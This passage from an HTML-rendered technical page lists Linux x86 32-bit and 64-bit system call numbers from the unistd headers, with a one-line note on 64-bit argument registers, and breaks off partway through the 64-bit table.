241</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_getaffinity 242</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_set_thread_area 243</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_get_thread_area 244</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_setup 245</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_destroy 246</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_getevents 247</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_submit 248</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_io_cancel 249</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fadvise64 250</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_exit_group 252</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lookup_dcookie 253</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_create 254</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_ctl 255</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_wait 256</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_remap_file_pages 257</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_set_tid_address 258</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_create 259</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_settime 260</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_gettime 261</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_getoverrun 262</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timer_delete 263</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_settime 264</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_gettime 265</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_getres 266</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_nanosleep 267</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_statfs64 268</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fstatfs64 269</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_tgkill 270</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_utimes 271</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fadvise64_64 272</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vserver 273</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mbind 274</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_get_mempolicy 275</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_set_mempolicy 276</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_open 277</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_unlink 278</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_timedsend 279</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_timedreceive 280</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_notify 281</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mq_getsetattr 282</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_kexec_load 283</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_waitid 284</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_add_key 286</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_request_key 287</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_keyctl 288</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ioprio_set 289</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ioprio_get 290</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_inotify_init 291</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_inotify_add_watch 292</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_inotify_rm_watch 293</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_migrate_pages 294</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_openat 295</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mkdirat 296</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mknodat 297</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchownat 298</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_futimesat 299</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fstatat64 300</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_unlinkat 301</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_renameat 302</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_linkat 303</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_symlinkat 304</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readlinkat 305</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchmodat 306</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_faccessat 307</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pselect6 308</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ppoll 309</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_unshare 310</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_set_robust_list 311</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_get_robust_list 312</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_splice 313</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sync_file_range 314</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_tee 315</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vmsplice 316</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_move_pages 317</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getcpu 318</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_pwait 319</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_utimensat 320</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_signalfd 321</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timerfd_create 322</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_eventfd 323</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fallocate 324</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timerfd_settime 325</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_timerfd_gettime 326</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_signalfd4 327</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_eventfd2 328</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_epoll_create1 329</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_dup3 330</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pipe2 331</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_inotify_init1 332</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_preadv 333</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pwritev 334</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_tgsigqueueinfo 335</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_perf_event_open 336</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_recvmmsg 337</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fanotify_init 338</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fanotify_mark 339</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_prlimit64 340</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_name_to_handle_at 341</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_open_by_handle_at 342</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clock_adjtime 343</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_syncfs 344</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendmmsg 345</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setns 346</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_process_vm_readv 347</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_process_vm_writev 348</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_kcmp 349</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_finit_module 350</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_setattr 351</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_getattr 352</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_renameat2 353</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_seccomp 354</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getrandom 355</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_memfd_create 356</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_bpf 357</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_execveat 358</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_socket 359</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_socketpair 360</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_bind 361</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_connect 362</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_listen 363</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_accept4 364</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getsockopt 365</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setsockopt 366</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getsockname 367</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpeername 368</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendto 369</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendmsg 370</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_recvfrom 371</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_recvmsg 372</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_shutdown 373</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_userfaultfd 374</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_membarrier 375</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mlock2 376</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_copy_file_range 377</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_preadv2 378</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pwritev2 379</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span> <span class=\"comment\">/* _ASM_X86_UNISTD_32_H */</span></span></span><br></pre></td></tr></table></figure>\n<h5><span id=\"264bit\">2）64bit</span></h5><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">rdi, rsi, rdx, rcx, r8, r9。（<span class=\"built_in\">stack</span>）</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifndef</span> _ASM_X86_UNISTD_64_H</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> _ASM_X86_UNISTD_64_H 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_read 0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_write 1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_open 2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_close 3</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_stat 4</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fstat 5</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lstat 6</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_poll 7</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lseek 8</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mmap 9</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mprotect 10</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_munmap 11</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_brk 12</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigaction 13</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigprocmask 14</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigreturn 15</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ioctl 16</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pread64 17</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pwrite64 18</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readv 19</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_writev 20</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_access 21</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pipe 22</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_select 23</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sched_yield 24</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mremap 25</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_msync 26</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mincore 27</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_madvise 28</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_shmget 29</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_shmat 30</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_shmctl 31</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_dup 32</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_dup2 33</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_pause 34</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_nanosleep 35</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getitimer 36</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_alarm 37</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setitimer 38</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpid 39</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendfile 40</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_socket 41</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_connect 42</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_accept 43</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendto 44</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_recvfrom 45</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sendmsg 46</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_recvmsg 47</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_shutdown 48</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_bind 49</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_listen 50</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getsockname 51</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpeername 52</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_socketpair 53</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setsockopt 54</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getsockopt 55</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_clone 56</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fork 57</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_vfork 58</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_execve 59</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_exit 60</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_wait4 61</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_kill 62</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_uname 63</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_semget 64</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_semop 65</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_semctl 66</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_shmdt 67</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_msgget 68</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_msgsnd 69</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_msgrcv 70</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_msgctl 71</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fcntl 72</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_flock 73</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fsync 74</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fdatasync 75</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_truncate 76</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ftruncate 77</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getdents 78</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getcwd 79</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chdir 80</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchdir 81</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rename 82</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_mkdir 83</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rmdir 84</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_creat 85</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_link 86</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_unlink 87</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_symlink 88</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_readlink 89</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chmod 90</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchmod 91</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_chown 92</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_fchown 93</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_lchown 94</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_umask 95</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_gettimeofday 96</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getrlimit 97</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getrusage 98</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sysinfo 99</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_times 100</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_ptrace 101</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getuid 102</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_syslog 103</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getgid 104</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setuid 105</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setgid 106</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_geteuid 107</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getegid 108</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setpgid 109</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getppid 110</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpgrp 111</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setsid 112</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setreuid 113</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setregid 114</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getgroups 115</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setgroups 116</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setresuid 117</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getresuid 118</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setresgid 119</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getresgid 120</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getpgid 121</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setfsuid 122</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_setfsgid 123</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_getsid 124</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_capget 125</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_capset 126</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigpending 127</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigtimedwait 128</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigqueueinfo 129</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_rt_sigsuspend 130</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_sigaltstack 131</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __NR_utime 132</span></span><br><span class=\"line\"><span 